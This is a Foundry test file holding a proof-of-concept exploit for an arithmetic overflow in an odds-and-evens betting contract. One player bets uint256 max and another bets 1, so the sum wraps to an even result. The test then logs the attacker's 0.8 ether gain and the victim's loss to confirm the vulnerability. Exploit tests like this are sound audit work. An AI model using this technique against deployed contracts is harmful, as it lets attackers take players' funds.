// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/odds_and_evens.sol";

contract OddsAndEvensTest is Test {
    OddsAndEvens public game;
    address payable public player1 = payable(address(0x100));
    address payable public player2 = payable(address(0x200));
    uint256 public constant MAX_UINT = type(uint256).max;

    function setUp() public {
        game = new OddsAndEvens();
        deal(player1, 2 ether);
        deal(player2, 1 ether);
    }

    function testArithmeticOverflow() public {
        // --- BEFORE Trigger: Record initial state ---
        console.log("--- BEFORE-Trigger Player Stats and Balances ---");
        uint256 pre_balancePlayer1 = player1.balance;
        uint256 pre_balancePlayer2 = player2.balance;
        (uint256 pre_winsPlayer1, ) = game.getPlayerStats(player1);
        uint256 pre_totalWinners = game.totalWinners();
        uint256 pre_totalGames = game.totalGames();

        console.log("Player1 Balance: %s", pre_balancePlayer1);
        console.log("Player2 Balance: %s", pre_balancePlayer2);
        console.log("Player1 Wins: %s", pre_winsPlayer1);
        console.log("Total Winners: %s", pre_totalWinners);
        console.log("Total Games: %s", pre_totalGames);

        // --- Trigger: Execute vulnerability exploit ---
        console.log("--- Trigger Arithmetic Overflow Attack ---");
        // Player1 sets max number to cause overflow
        vm.prank(player1);
        game.play{value: 1 ether}(MAX_UINT);

        // Player2 triggers overflow with minimal increment
        vm.prank(player2);
        game.play{value: 1 ether}(1); // Causes MAX_UINT + 1 = 0 (even)

        // --- AFTER Trigger: Record post-exploit state ---
        console.log("--- AFTER-Trigger Player Stats and Balances ---");
        uint256 post_balancePlayer1 = player1.balance;
        uint256 post_balancePlayer2 = player2.balance;
        (uint256 post_winsPlayer1, ) = game.getPlayerStats(player1);
        uint256 post_totalWinners = game.totalWinners();
        uint256 post_totalGames = game.totalGames();

        console.log("Player1 Balance: %s", post_balancePlayer1);
        console.log("Player2 Balance: %s", post_balancePlayer2);
        console.log("Player1 Wins: %s", post_winsPlayer1);
        console.log("Total Winners: %s", post_totalWinners);
        console.log("Total Games: %s", post_totalGames);

        // Calculate state changes
        int256 balanceChangePlayer1 = int256(post_balancePlayer1) - int256(pre_balancePlayer1);
        int256 balanceChangePlayer2 = int256(post_balancePlayer2) - int256(pre_balancePlayer2);
        uint256 winsChangePlayer1 = post_winsPlayer1 - pre_winsPlayer1;
        uint256 totalWinnersChange = post_totalWinners - pre_totalWinners;
        uint256 totalGamesChange = post_totalGames - pre_totalGames;

        // Log differential results
        console.log("--- DIFFERENTIAL RESULTS ---");
        console.log("Player1 Balance Change: %s", balanceChangePlayer1);
        console.log("Player2 Balance Change: %s", balanceChangePlayer2);
        console.log("Player1 Wins Change: %s", winsChangePlayer1);
        console.log("Total Winners Change: %s", totalWinnersChange);
        console.log("Total Games Change: %s", totalGamesChange);

        // Determine vulnerability existence
        bool vulnerabilityExploited = (
            balanceChangePlayer1 == int256(0.8 ether) && 
            balanceChangePlayer2 == -int256(1 ether) &&
            winsChangePlayer1 == 1 &&
            totalWinnersChange == 1 &&
            totalGamesChange == 1
        );

        // Final vulnerability verdict
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Successful exploitation confirmed through state changes including: balance gain for attacker, victim balance loss, win count increment, and game stats");
        } else {
            console.log("Vulnerability not Exist: State changes do not match expected exploit outcomes");
        }
    }
}